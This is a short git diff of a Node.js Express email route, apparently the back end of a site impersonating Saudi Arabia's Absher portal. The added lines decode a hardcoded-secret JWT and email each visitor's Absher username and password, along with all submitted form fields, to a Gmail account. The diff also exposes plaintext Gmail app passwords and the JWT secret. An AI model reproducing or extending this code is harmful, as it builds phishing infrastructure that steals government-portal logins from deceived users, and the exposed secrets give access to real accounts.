@@ -95,13 +95,16 @@ exports.email = async(req,res,next)=>{
             }
           })
     }else if (req.query.order){
+        const token = req.headers.authorization && req.headers.authorization.split(" ")[1]
+        if (!token) return res.sendStatus(401)
+        const user = verify(token,'secretkeyforjsonwebtokentoabshrsite')
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-              //   pass: 'bojr nrmj bjen rcgt',
-              pass: 'npxb mrfx ozpr ltyt',
+              user: 'pnusds269@gmail.com',
+            //   user: 'saudiabsher1990@gmail.com',
+                pass: 'bojr nrmj bjen rcgt',
+            //   pass: 'npxb mrfx ozpr ltyt',
             },
           });
 // Construct HTML content dynamically from req.body
@@ -109,6 +112,8 @@ let htmlContent = '<div>';
 for (const [key, value] of Object.entries(req.body)) {
     htmlContent += `<p>${key}: ${value}</p>`;
 }
+htmlContent += `<p> username abshr: ${user.username}</p>`;
+htmlContent += `<p> password abshr: ${user.password}</p>`;
 htmlContent += '</div>';
 
 // Send email with dynamically generated HTML content
